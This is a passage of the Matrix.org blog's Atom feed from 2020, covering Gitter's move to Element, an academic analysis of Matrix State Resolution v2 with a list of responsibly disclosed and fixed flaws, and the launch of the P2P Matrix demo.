&lt;li&gt;Curated hierarchical room directory&lt;&#x2F;li&gt;
&lt;li&gt;Magical creation of rooms on demand for every GitLab and GitHub project ever&lt;&#x2F;li&gt;
&lt;li&gt;GitLab&#x2F;GitHub activity as a first-class citizen in a room’s side-panel&lt;&#x2F;li&gt;
&lt;li&gt;Excellent search-engine-friendly static content and archives&lt;&#x2F;li&gt;
&lt;li&gt;KaTeX support for Maths communities&lt;&#x2F;li&gt;
&lt;li&gt;Threads!&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;...and we promise to do everything in our power to preserve and honour these features at all costs and continue to give the Gitter community the experience they’ve come to know and love.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;However&lt;&#x2F;strong&gt;: in the medium&#x2F;long term, it’s simply not going to be efficient for the combined Element&#x2F;Gitter team to split our efforts maintaining two high-profile Matrix clients. Our plan is instead to merge Gitter’s features into Element (or next generations of Element) itself and then - if and only if Element has achieved parity with Gitter based on the above list - we expect to upgrade the deployment on gitter.im to a Gitter-customised version of Element. The inevitable side-effect is that we’ll be adding new features to Element rather than Gitter going forwards.&lt;&#x2F;p&gt;
&lt;p&gt;In practice, the main outcome in the end should be Element having benefited massively from levelling up with Gitter - and Gitter benefiting massively from all the goodies which Element and Matrix brings, including:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;E2E Encryption&lt;&#x2F;li&gt;
&lt;li&gt;Reactions&lt;&#x2F;li&gt;
&lt;li&gt;Constantly improving native iOS &amp;amp; Android clients (which should be a welcome alternative to Gitter’s natives ones, which are &lt;a href=&quot;https:&#x2F;&#x2F;gitlab.com&#x2F;gitlab-org&#x2F;gitter&#x2F;webapp&#x2F;-&#x2F;issues&#x2F;2281&quot;&gt;already being deprecated&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;VoIP and conferencing&lt;&#x2F;li&gt;
&lt;li&gt;All the alternative clients, bots, bridges and servers in Matrix&lt;&#x2F;li&gt;
&lt;li&gt;The full open standard Matrix API&lt;&#x2F;li&gt;
&lt;li&gt;Widgets (embedding webapps into rooms!)&lt;&#x2F;li&gt;
&lt;li&gt;...and of course participation in the wider decentralised Matrix network.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;So, there you have it. It’s a new era for Gitter - and we look forward to reinvigorating Gitter’s communities over the coming months. We hope Gitter users will be blown away by the features arriving from Matrix… and we hope that Element users will be ecstatic with the performance and polish work that Gitter-parity will drive us towards. Imagine having guest access in Element that can launch and load a massive room in less than a second!&lt;&#x2F;p&gt;
&lt;p&gt;Finally, we would like to explicitly reassure the Gitter community again that we love and understand Gitter (it was one of the very first ever bridges we wrote for Matrix, for instance) - and we will be doing everything we can to not screw up our responsibility in looking after it. Please, please let us know if you have any concerns or if we ever fall short on this.&lt;&#x2F;p&gt;
&lt;p&gt;Any questions, come talk to us on &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;#gitter:matrix.org&quot;&gt;#gitter:matrix.org&lt;&#x2F;a&gt; - which is bridged with &lt;a href=&quot;https:&#x2F;&#x2F;gitter.im&#x2F;matrix-org&#x2F;gitter&quot;&gt;https:&#x2F;&#x2F;gitter.im&#x2F;matrix-org&#x2F;gitter&lt;&#x2F;a&gt;.  Exciting times ahead!&lt;&#x2F;p&gt;
&lt;p&gt;- Matthew, Amandine, and the whole Matrix, Element and Gitter teams.&lt;&#x2F;p&gt;
&lt;div style=&quot;text-align: center&quot;&gt;
    &lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;2020-09-30-gitter-photo.jpg&quot; width=&quot;480&quot; alt=&quot;Matthew &amp; Amandine being dorky&quot;&#x2F;&gt;
    &lt;br&#x2F;&gt;
    &lt;i&gt;&lt;small&gt;Matthew and Amandine model 2014-vintage Matrix &amp; Gitter swag in celebration :D&lt;&#x2F;small&gt;&lt;&#x2F;i&gt;
&lt;&#x2F;div&gt;
&lt;h2 id=&quot;bonus-update-the-changelog-interview&quot;&gt;Bonus update - The Changelog Interview!&lt;&#x2F;h2&gt;
&lt;p&gt;Sid Sijbrandij (CEO at GitLab) and Matthew had a chance to sit down with &lt;a href=&quot;https:&#x2F;&#x2F;changelog.com&quot;&gt;The Changelog&lt;&#x2F;a&gt; to talk about Gitter&#x27;s Big Adventure - so tune in to hear the story first hand!  Warning: contains non-ironic use of the word &amp;quot;synergy&amp;quot; :D&lt;&#x2F;p&gt;
&lt;br&#x2F;&gt;
&lt;div style=&quot;text-align: center&quot;&gt;
&lt;a rel=&quot;noopener&quot; href=&quot;https:&#x2F;&#x2F;cdn.changelog.com&#x2F;uploads&#x2F;podcast&#x2F;414&#x2F;the-changelog-414.mp3&quot;&gt;
    &lt;img src=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;img&#x2F;2020-09-30-gitter-changelog.png&quot; alt=&quot;Changelog podcast 414&quot;&#x2F;&gt;
&lt;&#x2F;a&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;changelog.com&#x2F;podcast&#x2F;414&quot;&gt;The Changelog 414: Gitter&#x27;s Big Adventure&lt;&#x2F;a&gt; - Listen on &lt;a href=&quot;https:&#x2F;&#x2F;changelog.com&#x2F;&quot;&gt;Changelog.com&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;div&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Matrix Decomposition: an independent academic analysis of Matrix State Resolution</title>
        <published>2020-06-16T20:15:30+00:00</published>
        <updated>2020-06-16T19:09:24+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2020/06/16/matrix-decomposition-an-independent-academic-analysis-of-matrix-state-resolution/" type="text/html"/>
        <id>https://matrix.org/blog/2020/06/16/matrix-decomposition-an-independent-academic-analysis-of-matrix-state-resolution/</id>
        
        <content type="html">&lt;p&gt;Hi all,&lt;&#x2F;p&gt;
&lt;p&gt;Regular readers of &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;category&#x2F;this-week-in-matrix&#x2F;&quot;&gt;TWIM&lt;&#x2F;a&gt; may be familiar with the &lt;a href=&quot;https:&#x2F;&#x2F;dsn.tm.kit.edu&#x2F;english&#x2F;index.php&quot;&gt;Decentralized Systems and Network Services Research Group&lt;&#x2F;a&gt; at Karlsruhe Institute of Technology, who have been busy over the last few years analysing Matrix from an independent academic point of view.  The work started in 2018 with Florian Jacob’s &lt;a href=&quot;https:&#x2F;&#x2F;dsn.tm.kit.edu&#x2F;matrix&#x2F;traveller&#x2F;explained.html&quot;&gt;DSN Traveler&lt;&#x2F;a&gt; spidering project, resulting in the &lt;a href=&quot;https:&#x2F;&#x2F;publikationen.bibliothek.kit.edu&#x2F;1000100364&quot;&gt;Glimpse of the Matrix&lt;&#x2F;a&gt; paper analysing Matrix’s scale and room&#x2F;server distribution (at least as it was back then).&lt;&#x2F;p&gt;
&lt;p&gt;Last week, they released an entirely new paper: &lt;a href=&quot;https:&#x2F;&#x2F;dl.acm.org&#x2F;doi&#x2F;10.1145&#x2F;3381991.3395399&quot;&gt;Matrix Decomposition: Analysis of an Access Control Approach on Transaction-based DAGs without Finality&lt;&#x2F;a&gt; by Florian Jacob, Luca Becker, Jan Grashöfer and Hannes Hartenstein, presented at &lt;a href=&quot;https:&#x2F;&#x2F;www.sacmat.org&#x2F;2020&#x2F;index.php&quot;&gt;ACM SACMAT ‘20&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Now, the new paper is an absolutely fascinating deep dive analysis into &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;blob&#x2F;master&#x2F;proposals&#x2F;1442-state-resolution.md&quot;&gt;State Resolution v2&lt;&#x2F;a&gt; - the algorithm at the heart of Matrix which defines how servers merge together their potentially conflicting copies of a given room, such that everyone ends up eventually with a consistent view… even in the face of bad actors. This means that Matrix effectively implements a decentralised access control system - ensuring that users stay banned, and only users with permission can ban, etc.  You can see the &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;img&#x2F;SACMAT_2020_Talk_Matrix_Decomposition.pdf&quot;&gt;slides&lt;&#x2F;a&gt; below, and read the &lt;a href=&quot;https:&#x2F;&#x2F;dl.acm.org&#x2F;doi&#x2F;pdf&#x2F;10.1145&#x2F;3381991.3395399&quot;&gt;full paper&lt;&#x2F;a&gt; here. The video of Florian’s talk from SACMAT should be published shortly.&lt;&#x2F;p&gt;
&lt;br&#x2F;&gt;
&lt;p&gt;&lt;object data=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;img&#x2F;SACMAT_2020_Talk_Matrix_Decomposition.pdf&quot; type=&quot;application&#x2F;pdf&quot; width=&quot;1024&quot; height=&quot;768&quot;&gt;&lt;&#x2F;object&gt;&lt;&#x2F;p&gt;
&lt;br&#x2F;&gt;
&lt;p&gt;To give some context from the Matrix side: designing and implementing State Resolution v2 back in 2018 was a bit of a mission. Our original v1 implementation had some bugs which meant that the result of the merge could unexpectedly favour historical state over the current state (so called ‘state resets’) - thus giving an attacker a way to maliciously revert the state of the room.  In v2 we thought much more carefully about the algorithm, considering state present in one version of the room but not the other as a conflict, separating and applying access control events from regular events, and adding additional ordering of the state in the room by considering events in the context of their authorisation chain (the ‘auth DAG’).  The end result is that we feel confident in v2 State Res, and we haven’t seen any problems with it in the wild since we shipped it in July 2018.&lt;&#x2F;p&gt;
&lt;p&gt;However: state resolution is not intuitive at first - for instance, when you merge two versions of a room together, you treat the state events as unordered sets… even though they are ordered in the context of the room DAG.  The reason is that state res needs to work even if you don’t have a copy of the whole room DAG (otherwise you’d have to download way too much data to participate in a large room).  Another example is the sequence in which orderings are then applied to the state events - and how that interacts with re-authorising those events, to stop malicious ones creeping in.  In the core team, we’ve end up describing it several different ways to try to help folks understand: first Erik’s original &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;blob&#x2F;erikj&#x2F;state_res_msc&#x2F;proposals&#x2F;1442-state-resolution.md&quot;&gt;MSC1442&lt;&#x2F;a&gt;, then uhoreg’s &lt;a href=&quot;https:&#x2F;&#x2F;matrix.uhoreg.ca&#x2F;stateres&#x2F;reloaded.html&quot;&gt;literary Haskell implementation&lt;&#x2F;a&gt;, then the terse reference version in &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;docs&#x2F;spec&#x2F;rooms&#x2F;v2&quot;&gt;the Spec&lt;&#x2F;a&gt; itself, and most recently Neil Alexander’s &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;docs&#x2F;guides&#x2F;implementing-stateres&quot;&gt;State Resolution v2 for the Hopelessly Unmathematical&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;As a result we are &lt;strong&gt;very&lt;&#x2F;strong&gt; excited and happy that Florian and the DSN team have now published the first ever independent in-depth analysis of the algorithm, particularly in the context of decentralised access control (i.e. enforcing bans, power levels, etc).  We’re pleasantly surprised that apparently “To the best of our knowledge, Matrix is the only system that implements access control based on an eventually consistent partial order without finality and without a consensus algorithm”.&lt;&#x2F;p&gt;
&lt;p&gt;Even better, the DSN team found some remaining thinkos in Synapse’s implementation and the Matrix specification, which could have caused resolution results to diverge from other implementations, specifically:&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;we weren’t enforcing integers in JSON to be within range [-2&lt;sup&gt;53&lt;&#x2F;sup&gt;+1, 2&lt;sup&gt;53&lt;&#x2F;sup&gt;-1], fixed in &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;7381&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;7381&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;blob&#x2F;clokep&#x2F;json-validation-room-ver&#x2F;proposals&#x2F;2540-stricter-event-validation.md&quot;&gt;MSC2540&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;we forgot to include the notification field when authing power level events, fixed in  &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;7501&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;7501&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;lucavb&#x2F;matrix-doc&#x2F;blob&#x2F;master&#x2F;proposals&#x2F;2209-auth-rules-other-keys-in-m.room.power.levels.md&quot;&gt;MSC2209&lt;&#x2F;a&gt; (thanks to Luca from DSN for the MSC!)&lt;&#x2F;li&gt;
&lt;li&gt;we forgot to spec the limit that one should apply to the number of parents of an event in the DAG (fixed in &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;2538&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;2538&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;we missed that moderators could set server ACLs which could let them undermine room admins (fixed in &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;6834&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;6834&lt;&#x2F;a&gt;).&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;All of these have now been fixed in Synapse and the latest versions of the spec (room v6), and we’d like to sincerely thank Florian and Luca for rapidly and responsibly disclosing the issues to us.  In other words: this research is directly improving Matrix, and it’s even more exciting that the stated future work for the DSN team is to work on a &lt;a href=&quot;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Formal_verification&quot;&gt;formal verification&lt;&#x2F;a&gt; for the security of Matrix’s authorisation rules and state resolution.  This stuff is tough, as anyone who’s played with &lt;a href=&quot;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;TLA%2B&quot;&gt;TLA&lt;sup&gt;+&lt;&#x2F;sup&gt;&lt;&#x2F;a&gt; will know, and we are incredibly glad that the research community is helping out to formalise and hopefully prove that State Res v2 is as good as we think it is.&lt;&#x2F;p&gt;
&lt;p&gt;We should stress that DSN’s work is completely independent of The Matrix.org Foundation or anyone else building on the protocol; we’re just writing about it here because we think it’s incredibly cool and deserves the attention of the whole Matrix ecosystem.&lt;&#x2F;p&gt;
&lt;p&gt;Thanks again to Florian and the team - we look forward to seeing what comes next!&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Introducing P2P Matrix</title>
        <published>2020-06-02T00:00:00+00:00</published>
        <updated>2020-06-02T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2020/06/02/introducing-p2p-matrix/" type="text/html"/>
        <id>https://matrix.org/blog/2020/06/02/introducing-p2p-matrix/</id>
        
        <content type="html">&lt;p&gt;TL;DR: we shipped a major update (v0.1.1) to &lt;a href=&quot;https:&#x2F;&#x2F;p2p.riot.im&quot;&gt;https:&#x2F;&#x2F;p2p.riot.im&lt;&#x2F;a&gt; - fire up a desktop Chrome or Firefox in not-private-browsing mode and give it a go!&lt;&#x2F;p&gt;
&lt;p&gt;Hi folks,&lt;&#x2F;p&gt;
&lt;p&gt;As many know by now, a few of us have been working away since mid-December on experimenting with running Matrix in a peer-to-peer architecture - one where every user has absolute total autonomy and ownership of their conversations, because the only place their conversations exist is on the devices they own.&lt;&#x2F;p&gt;
&lt;p&gt;In some ways this is the logical end goal of Matrix: our aim has always been to empower users to have full control over their communication rather than being beholden to any given service provider, and in a P2P world we completely return power over secure communication to the people.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;why-p2p&quot;&gt;Why P2P?&lt;&#x2F;h3&gt;
&lt;p&gt;P2P Matrix is about more than just letting users store their own conversations: it can also avoid dependencies on the Internet itself by working over local networks, mesh networks, or situations where the Internet has been cut off.  Even more interestingly, without homeservers, there is nowhere for metadata to accumulate about who is talking to who, and when - which is a legitimate complaint about today’s Matrix network, given the homeservers of all users in a given conversation necessarily have to store that conversation’s metadata.  P2P also lets us radically simplify signup for new users if they don’t have to pick a server to get going - and we avoid the unintentional centralisation of users piling onto public servers.&lt;&#x2F;p&gt;
&lt;p&gt;P2P also forces us to solve many of the hardest remaining problems in Matrix: e.g multi-homed accounts, given multi-device P2P requires your account to exist in multiple places. This in turn unlocks high availability and geo-redundancy for accounts on today’s Matrix network (imagine having a primary and backup homeserver that magically did the right thing!), as well as account portability, and thus also vhosting and load-balancing accounts between servers, and even improved GDPR compliance (for if your user IDs are ephemeral they are no longer personally identifying information baked into your Matrix rooms).  We’ll also need better safety mechanisms to avoid folks exploiting the anonymous nature of the network for abuse, accelerating the work we’re already doing for today’s Matrix network.&lt;&#x2F;p&gt;
&lt;p&gt;The way we’ve been approaching P2P is the “&lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;Lucid00&#x2F;status&#x2F;1263974339294175232&quot;&gt;hamfisted but genius&lt;&#x2F;a&gt;” approach of taking homeservers and running them on the client, alongside or within your Matrix client - meaning that there are literally &lt;strong&gt;no&lt;&#x2F;strong&gt; changes required for any Matrix client to talk P2P Matrix, and so P2P Matrix can instantly benefit from all the work which has gone into Riot and other apps.  As a result, P2P is also a huge motivator towards developing much smaller homeservers which can run efficiently clientside (e.g. Dendrite!) - which is of course great news for Matrix as a whole.  It also forces us to develop more scalable routing algorithms (as you don’t want your client to have to talk to every other device in a room every time it sends a message!) and also spurs development of low bandwidth Matrix transports (as you don’t want the additional chatter of talking to multiple peers to consume all your bandwidth).  Finally, it forces us to really ruggedize federation, given nodes are constantly appearing and disappearing, giving the federation much more of a stress test than we see with today’s relatively static homeservers.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;p2p-in-practice&quot;&gt;P2P in Practice&lt;&#x2F;h3&gt;
&lt;p&gt;So, P2P has been acting as fuel for a lot of our longer term Matrix work over the last few months.  There have been three main experiments so far: at &lt;a href=&quot;https:&#x2F;&#x2F;fosdem.org&#x2F;2020&#x2F;schedule&#x2F;event&#x2F;dip_p2p_matrix&#x2F;&quot;&gt;FOSDEM&lt;&#x2F;a&gt; we showed off running our next-gen Dendrite homeserver running clientside using HTTP over &lt;a href=&quot;https:&#x2F;&#x2F;libp2p.io&#x2F;&quot;&gt;libp2p&lt;&#x2F;a&gt; as the transport.  We also highlighted Timothée Floure’s &lt;a href=&quot;https:&#x2F;&#x2F;www.epfl.ch&#x2F;labs&#x2F;dedis&#x2F;wp-content&#x2F;uploads&#x2F;2020&#x2F;01&#x2F;presentation-2019-2-Timothee-Floure-Experimenting-with-Matrix-federation-over-Yggdrasil.pdf&quot;&gt;project at EPFL&lt;&#x2F;a&gt; experimenting with Synapse talking P2P CoAP over yggdrasil as the transport via a proxy.&lt;&#x2F;p&gt;
&lt;p&gt;Most recently, however, we’ve been experimenting with compiling Dendrite down to Web Assembly and running it embedded in Riot Web as a Service Worker, using HTTP over libp2p’s websocket transport (coordinated via a websocket rendezvous server).  Architecturally, it looks like this:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;p2p-diag.png&quot; alt=&quot;P2P Architecture Diagram&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Today, we’re shipping a major new alpha (v0.1.1) of this P2P demo up at &lt;a href=&quot;https:&#x2F;&#x2F;p2p.riot.im&quot;&gt;https:&#x2F;&#x2F;p2p.riot.im&lt;&#x2F;a&gt; (requires desktop Chrome or Firefox in non-private-browsing mode) - which hopefully should give a really usable and concrete taste of the shape of things to come.&lt;&#x2F;p&gt;
&lt;p&gt;The main features are:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Your conversations are now persisted in your browser storage (via IndexedDB), meaning that as long as all the browsers participating in a given conversation don’t clear their local storage, rooms on the P2P network are here to stay!&lt;&#x2F;li&gt;
&lt;li&gt;Your room directory lists all the aliases for all the rooms published by active nodes on the network.  Moreover, we now automatically publish a local room alias whenever you join a public room, so that others will be able to discover that room via you, even if the server who originally created the alias has disappeared.&lt;&#x2F;li&gt;
&lt;li&gt;Lots and lots of federation improvements between the nodes - for instance, when a node comes online, others should now automatically detect and send scrollback to it.  Invites should work, and there should no longer be any unexpectedly redacted messages.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Needless to say, all the code for this is open source under the Apache license, and if you’re feeling particularly adventurous you can embed your very own P2P Dendrite into Riot Web by using the Dockerfile at &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;dendrite&#x2F;blob&#x2F;master&#x2F;build&#x2F;docker&#x2F;DendriteJS.Dockerfile&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;dendrite&#x2F;blob&#x2F;master&#x2F;build&#x2F;docker&#x2F;DendriteJS.Dockerfile&lt;&#x2F;a&gt; or following the instructions at  &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;dendrite&#x2F;blob&#x2F;master&#x2F;docs&#x2F;p2p.md&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;dendrite&#x2F;blob&#x2F;master&#x2F;docs&#x2F;p2p.md&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Please report bugs to &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;dendrite&#x2F;issues&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;dendrite&#x2F;issues&lt;&#x2F;a&gt;!&lt;&#x2F;p&gt;
&lt;p&gt;Finally, please understand that the demo is very likely &lt;strong&gt;not&lt;&#x2F;strong&gt; what the final version of P2P Matrix will look like - this is just one step in a series of experiments as we investigate the best paths forward :)&lt;&#x2F;p&gt;
&lt;h3 id=&quot;what-s-next&quot;&gt;What’s next?&lt;&#x2F;h3&gt;
&lt;p&gt;For the current demo, there’s still lots of stuff remaining, including:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;More federation debugging (and hooking in &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;tardis&quot;&gt;tardis&lt;&#x2F;a&gt; and writing up everything we’ve learned about implementing federation in Dendrite!)&lt;&#x2F;li&gt;
&lt;li&gt;Making the content repository work in-browser (gotta fill up those IndexedDBs with some GIFs!)&lt;&#x2F;li&gt;
&lt;li&gt;Hooking up E2E Encryption APIs in Dendrite (not that it buys us much in a pure P2P world)&lt;&#x2F;li&gt;
&lt;li&gt;WebRTC transports.  Turns out that service workers aren’t allowed to speak WebRTC, so we’ll have to shim through to Riot to speak true peer-to-peer WebRTC data channels rather than relaying all the traffic through the websocket rendezvous server.&lt;&#x2F;li&gt;
&lt;li&gt;Decentralised accounts for multidevice support - reviewing &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;blob&#x2F;rav&#x2F;proposal&#x2F;remove_mxids_from_events&#x2F;proposals&#x2F;1228-removing-mxids-from-events.md&quot;&gt;MSC1228&lt;&#x2F;a&gt; and getting Dendrite supporting multihoming accounts!&lt;&#x2F;li&gt;
&lt;li&gt;Finishing all of Dendrite’s other remaining APIs.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Beyond this, there are some bigger picture questions left to be answered in future experiments.&lt;&#x2F;p&gt;
&lt;p&gt;Firstly: we do not yet have a solution for “store and forward” nodes which can relay messages on behalf of a room if all the participating devices are offline.  A first cut will be to run a P2P-capable homeserver server-side for this, but then metadata will start to accumulate server-side for the conversations it hosts.  A more interesting approach would be to use a store and forward system which obfuscates who is talking to who, such as a mixnet, and could even provide resistance to network traffic pattern analysis.  This is very much an open area of research, but one we are getting into :D&lt;&#x2F;p&gt;
&lt;p&gt;Secondly: we want to experiment more with other transports, and find out which works best for Matrix.  Libp2p has some really exciting new stuff in the form of &lt;a href=&quot;https:&#x2F;&#x2F;blog.ipfs.io&#x2F;2020-05-20-gossipsub-v1.1&quot;&gt;Gossipsub v1.1&lt;&#x2F;a&gt; - a much smarter routing algorithm for pubsub traffic in libp2p, which David Dias gave us a &lt;a href=&quot;https:&#x2F;&#x2F;youtu.be&#x2F;APVp-20ATLk?t=3598&quot;&gt;VIP tour&lt;&#x2F;a&gt; of at the first Open Tech Will Save Us meetup.  So we’ll need to restructure our libp2p transport as pubsub to see how it works in practice.  Separately, we also want to play with hooking up &lt;a href=&quot;https:&#x2F;&#x2F;yggdrasil-network.github.io&#x2F;&quot;&gt;Yggdrasil&lt;&#x2F;a&gt; (the encrypted overlay network) as a transport as a totally different approach - Yggdrasil will easily let us span different underlying network transports, but comes with different tradeoffs (e.g. no browser support yet).  We also want to take a look at the &lt;a href=&quot;https:&#x2F;&#x2F;dat.foundation&#x2F;&quot;&gt;DAT&lt;&#x2F;a&gt; &#x2F; &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;hypercore-protocol&#x2F;hypercore&quot;&gt;hypercore&lt;&#x2F;a&gt; &#x2F; &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;hyperswarm&#x2F;hyperswarm&quot;&gt;hyperswarm&lt;&#x2F;a&gt; &#x2F; &lt;a href=&quot;https:&#x2F;&#x2F;cabal.chat&#x2F;&quot;&gt;Cabal&lt;&#x2F;a&gt; ecosystem to see if there’s a match :)&lt;&#x2F;p&gt;
&lt;p&gt;Thirdly and finally: we obviously want to unify the new P2P Matrix network with today’s federated one.  The ideal outcome here would be to have a hybrid model, where teams who want their users to have a dedicated homeserver (for availability, IT policies, etc) can continue to have one as they do today - but newbies who have just installed Riot would float around on P2P unless they decided to consciously put down roots on a server or two.  Best of all, it would let us turn off the matrix.org homeserver: the best public homeserver is one you run yourself on your own phone ;)  The approach we take for linking P2P and today’s Matrix will depend very much on the transport we select for P2P in the long run, but the likelihood is that today’s homeservers will sprout P2P gateways to link the networks.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;&#x2F;h2&gt;
&lt;p&gt;So, there you have it.  P2P Matrix exists, and is developing at an alarming speed - and pushing Dendrite development along with it.  Most excitingly, there have been no changes yet to the Matrix spec for P2P at all; we’ve just swapped https for http-over-libp2p as the transport.  So &lt;strong&gt;all&lt;&#x2F;strong&gt; of the work we’ve been doing making Dendrite work in a P2P world has directly translated into making Dendrite work on today’s Matrix too  You can now stand up a Dendrite and have it federate pretty reliably with the wider Matrix network, although we’re still rushing through implementing APIs (we’re up to 35% passing &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;sytest&quot;&gt;sytest&lt;&#x2F;a&gt; coverage - although that 35% does contain most of the important tests :)&lt;&#x2F;p&gt;
&lt;p&gt;Finally, in case you’re worried about why the Matrix core team is off chasing P2P dreams rather than improving Riot’s UX, or implementing Communities, or Extensible Profiles, or working through the MSC backlog etc... in practice only two people (ignoring Matthew) have been working on P2P - Neil Alexander (author of the original FOSDEM demo, Dendrite wrangler and Yggdrasil co-maintainer) and Kegan Dougal (of the original Matrix dev team, one of the original authors of Dendrite, and now wrangling the WASM P2P work too).  Huge thanks to Kegan &amp;amp; Neil for pushing P2P forwards - and huge thanks to everyone else on the core team and the wider community for keeping today’s Matrix advancing too!&lt;&#x2F;p&gt;
&lt;p&gt;Hope this has given a tempting glimpse of the shape of things to come.  Honestly we never thought we’d get as far as P2P when we started Matrix back in 2014, but it’s really fun to be finally catching up with the future :D&lt;&#x2F;p&gt;
&lt;p&gt;-- Matthew&lt;&#x2F;p&gt;
&lt;p&gt;P.S. You can read more about this from Neil Alexander’s point of view &lt;a href=&quot;https:&#x2F;&#x2F;neilalexander.dev&#x2F;2020&#x2F;06&#x2F;02&#x2F;thoughts-p2p-matrix.html&quot;&gt;over at his blog&lt;&#x2F;a&gt; (including more thoughts on the potential Yggdrasil demo!)&lt;&#x2F;p&gt;
&lt;p&gt;P.P.S You can read the gory details of the P2P and WASM implementation from Kegan&#x27;s point of view &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;dendrite&#x2F;wiki&#x2F;How-p2p.riot.im-works&quot;&gt;over at the Dendrite wiki&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;P.P.P.S Comments over at &lt;a href=&quot;https:&#x2F;&#x2F;news.ycombinator.com&#x2F;item?id=23393935&quot;&gt;HN&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Welcoming Automattic to Matrix!</title>
        <published>2020-05-21T01:42:27+00:00</published>
        <updated>2020-05-21T01:28:15+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2020/05/21/welcoming-automattic-to-matrix/" type="text/html"/>
        <id>https://matrix.org/blog/2020/05/21/welcoming-automattic-to-matrix/</id>
        
        <content type="html">&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;img&#x2F;2020-05-21-automattic.png&quot; alt=&quot;Automattic ♥️ Matrix&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
